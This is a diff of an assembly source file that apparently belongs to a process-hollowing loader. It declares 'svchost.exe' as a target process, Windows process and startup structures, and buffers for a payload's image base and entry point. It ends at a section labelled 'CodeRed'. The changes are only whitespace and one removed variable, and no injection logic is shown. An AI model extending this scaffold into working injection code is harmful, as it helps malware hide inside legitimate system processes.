@@ -2,28 +2,26 @@
 global WinMain
 
 section .BSS
-	process db "svchost.exe",0,0
-	
+	process db "svchost.exe",0,0	
 section .data	
 	
-
-	struc PROCESSINFO
-		.hProcess 		resd 2
-		.hThread 		resd 2
+struc PROCESSINFO
+	.hProcess 		resd 2
+	.hThread 		resd 2
         .dwProcessId 	resd 1
         .dwThreadId 	resd 1
-    endstruc
+endstruc
 	
 		
-    ProcInfo istruc PROCESSINFO
-        at PROCESSINFO.hProcess,dd 0
+ProcInfo istruc PROCESSINFO
+	at PROCESSINFO.hProcess,dd 0
         at PROCESSINFO.hThread,dd 0
         at PROCESSINFO.dwProcessId,dw 0
         at PROCESSINFO.dwThreadId,dw 0
-    iend
+iend
 	
 	
-	struc STARTUPINFOA 
+struc STARTUPINFOA 
         .cb resd 1
         .lpReserved resb 8
         .lpDesktop resb 8
@@ -45,7 +43,7 @@ section .data
     endstruc
 	
 
-	startup istruc STARTUPINFOA 
+startup istruc STARTUPINFOA 
        at STARTUPINFOA.cb, dd 0
        at STARTUPINFOA.lpReserved, db 0
        at STARTUPINFOA.lpDesktop, db 0
@@ -66,14 +64,14 @@ section .data
        at STARTUPINFOA.hStdError, dd 0
     iend
 
-    TamArqProgram times 8 dq 0
-    TamArqTarget times 8 dq 0
-    bufferFileName times 32 db 0
-    Buffer times 800000 db 0
-    addressAlocado times 8 dq 0
-    addressAlocadoEx times 8 dq 0
-    handle times 8 dq 0
-    entrypointTarget times 8 dq 0
+    	TamArqProgram times 8 dq 0
+    	TamArqTarget times 8 dq 0
+    	bufferFileName times 32 db 0
+    	Buffer times 800000 db 0
+    	addressAlocado times 8 dq 0
+    	addressAlocadoEx times 8 dq 0
+    	handle times 8 dq 0
+    	entrypointTarget times 8 dq 0
 	GetSizeTarget times 8 dq 0
 	lpPebImageBase times 8 dq 0
 	openProcessH times 8 dq 0
@@ -82,10 +80,6 @@ section .data
 	AddressEntryPoint times 8 dd 0
 	PID times 8 dd 0
 	alloc times 8 dd 0
-	
-	space dd 0
-	
-
 	
 section .codered
 	CodeRed:
